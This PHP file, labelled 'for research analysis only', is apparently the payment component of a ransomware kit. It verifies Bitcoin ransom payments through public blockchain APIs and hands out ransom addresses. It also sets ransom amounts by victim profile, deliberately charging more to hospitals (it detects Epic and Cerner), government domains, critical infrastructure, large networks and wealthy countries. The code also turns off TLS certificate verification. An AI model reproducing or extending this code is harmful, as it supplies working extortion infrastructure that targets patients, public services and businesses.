<?php
/**
 * Bitcoin Payment Verification API
 * FOR RESEARCH ANALYSIS ONLY
 */

class BitcoinAPI {
    private $api_endpoints = [
        'blockstream' => 'https://blockstream.info/api',
        'blockchain_info' => 'https://blockchain.info/rawaddr',
        'blockcypher' => 'https://api.blockcypher.com/v1/btc/main'
    ];
    
    private $exchange_rate_apis = [
        'coinbase' => 'https://api.coinbase.com/v2/exchange-rates?currency=BTC',
        'coingecko' => 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd'
    ];
    
    public function verifyPayment($bitcoin_address, $expected_amount, $time_window = 72) {
        try {
            $transactions = $this->getAddressTransactions($bitcoin_address);
            $cutoff_time = time() - ($time_window * 3600);
            
            $total_received = 0;
            $valid_transactions = [];
            
            foreach ($transactions as $tx) {
                if ($tx['timestamp'] >= $cutoff_time && $tx['confirmations'] >= 1) {
                    $total_received += $tx['value'];
                    $valid_transactions[] = $tx;
                }
            }
            
            $payment_verified = ($total_received >= $expected_amount * 1e8); // Convert BTC to satoshis
            
            return [
                'verified' => $payment_verified,
                'total_received' => $total_received / 1e8, // Convert back to BTC
                'expected_amount' => $expected_amount,
                'transactions' => $valid_transactions,
                'verification_time' => date('Y-m-d H:i:s')
            ];
            
        } catch (Exception $e) {
            error_log("Payment verification failed: " . $e->getMessage());
            return [
                'verified' => false,
                'error' => $e->getMessage()
            ];
        }
    }
    
    public function getAddressTransactions($address) {
        foreach ($this->api_endpoints as $provider => $base_url) {
            try {
                switch ($provider) {
                    case 'blockstream':
                        $url = "{$base_url}/address/{$address}/txs";
                        break;
                    case 'blockchain_info':
                        $url = "{$base_url}/{$address}";
                        break;
                    case 'blockcypher':
                        $url = "{$base_url}/addrs/{$address}?includeScript=true";
                        break;
                }
                
                $response = $this->makeHttpRequest($url);
                return $this->parseTransactions($response, $provider, $address);
                
            } catch (Exception $e) {
                error_log("Failed to get transactions from {$provider}: " . $e->getMessage());
                continue; // Try next provider
            }
        }
        
        throw new Exception("All Bitcoin API providers failed");
    }
    
    private function parseTransactions($response, $provider, $address) {
        $data = json_decode($response, true);
        $transactions = [];
        
        switch ($provider) {
            case 'blockstream':
                foreach ($data as $tx) {
                    foreach ($tx['vout'] as $output) {
                        if ($output['scriptpubkey_address'] === $address) {
                            $transactions[] = [
                                'txid' => $tx['txid'],
                                'value' => $output['value'],
                                'timestamp' => $tx['status']['block_time'] ?? time(),
                                'confirmations' => $tx['status']['confirmed'] ? 6 : 0,
                                'block_height' => $tx['status']['block_height'] ?? null
                            ];
                        }
                    }
                }
                break;
                
            case 'blockchain_info':
                foreach ($data['txs'] as $tx) {
                    foreach ($tx['out'] as $output) {
                        if ($output['addr'] === $address) {
                            $transactions[] = [
                                'txid' => $tx['hash'],
                                'value' => $output['value'],
                                'timestamp' => $tx['time'],
                                'confirmations' => $tx['confirmations'] ?? 0,
                                'block_height' => $tx['block_height'] ?? null
                            ];
                        }
                    }
                }
                break;
                
            case 'blockcypher':
                foreach ($data['txrefs'] as $tx) {
                    if ($tx['tx_output_n'] >= 0) { // Only incoming transactions
                        $transactions[] = [
                            'txid' => $tx['tx_hash'],
                            'value' => $tx['value'],
                            'timestamp' => strtotime($tx['confirmed']),
                            'confirmations' => $tx['confirmations'] ?? 0,
                            'block_height' => $tx['block_height'] ?? null
                        ];
                    }
                }
                break;
        }
        
        return $transactions;
    }
    
    public function getCurrentBTCRate($currency = 'USD') {
        foreach ($this->exchange_rate_apis as $provider => $url) {
            try {
                $response = $this->makeHttpRequest($url);
                $data = json_decode($response, true);
                
                switch ($provider) {
                    case 'coinbase':
                        return floatval($data['data']['rates'][$currency]);
                    case 'coingecko':
                        return floatval($data['bitcoin'][strtolower($currency)]);
                }
                
            } catch (Exception $e) {
                error_log("Failed to get BTC rate from {$provider}: " . $e->getMessage());
                continue;
            }
        }
        
        // Fallback rate if all APIs fail
        return 45000; // Approximate BTC/USD rate
    }
    
    public function calculateRansomAmount($victim_profile) {
        $base_amounts = [
            'individual' => 0.08,
            'small_business' => 0.5,
            'medium_business' => 2.5,
            'large_enterprise' => 10.0,
            'government' => 25.0,
            'healthcare' => 15.0,
            'critical_infrastructure' => 50.0
        ];
        
        $tier = $this->determineTier($victim_profile);
        $base_amount = $base_amounts[$tier] ?? 0.5;
        
        // Adjust based on various factors
        $multiplier = 1.0;
        
        // File count multiplier
        if ($victim_profile['files_encrypted'] > 100000) {
            $multiplier *= 1.5;
        } elseif ($victim_profile['files_encrypted'] > 10000) {
            $multiplier *= 1.2;
        }
        
        // Network size multiplier
        if ($victim_profile['network_size'] > 100) {
            $multiplier *= 2.0;
        } elseif ($victim_profile['network_size'] > 10) {
            $multiplier *= 1.3;
        }
        
        // Country economic factor
        $high_gdp_countries = ['US', 'DE', 'JP', 'GB', 'FR', 'CA', 'AU', 'CH', 'NL', 'SE'];
        if (in_array($victim_profile['country'], $high_gdp_countries)) {
            $multiplier *= 1.5;
        }
        
        return round($base_amount * $multiplier, 3);
    }
    
    private function determineTier($profile) {
        // Determine organization tier based on various indicators
        $domain = $profile['domain'] ?? '';
        $installed_software = $profile['installed_software'] ?? [];
        $network_size = $profile['network_size'] ?? 1;
        
        // Government indicators
        if (strpos($domain, '.gov') !== false || 
            strpos($domain, '.mil') !== false ||
            in_array('government', $profile['industry_keywords'] ?? [])) {
            return 'government';
        }
        
        // Healthcare indicators  
        if (strpos($domain, 'health') !== false ||
            strpos($domain, 'hospital') !== false ||
            in_array('Epic', $installed_software) ||
            in_array('Cerner', $installed_software)) {
            return 'healthcare';
        }
        
        // Enterprise indicators
        if ($network_size > 500 ||
            in_array('Active Directory', $installed_software) ||
            in_array('Exchange Server', $installed_software) ||
            in_array('SAP', $installed_software)) {
            return 'large_enterprise';
        }
        
        // Business size based on network and software
        if ($network_size > 50) {
            return 'medium_business';
        } elseif ($network_size > 5) {
            return 'small_business';
        }
        
        return 'individual';
    }
    
    public function generateBitcoinAddress() {
        // In real implementation, this would generate a new address
        // For research purposes, return from predefined pool
        $addresses = [
            'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
            '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2',
            '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy',
            'bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4',
            '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        ];
        
        return $addresses[array_rand($addresses)];
    }
    
    private function makeHttpRequest($url, $options = []) {
        $default_options = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_USERAGENT => 'BYJY-RwGen-Research/1.0',
            CURLOPT_SSL_VERIFYPEER => false
        ];
        
        $ch = curl_init($url);
        curl_setopt_array($ch, $default_options + $options);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        if (curl_errno($ch)) {
            throw new Exception('cURL error: ' . curl_error($ch));
        }
        
        curl_close($ch);
        
        if ($http_code !== 200) {
            throw new Exception("HTTP error: {$http_code}");
        }
        
        return $response;
    }
}
?>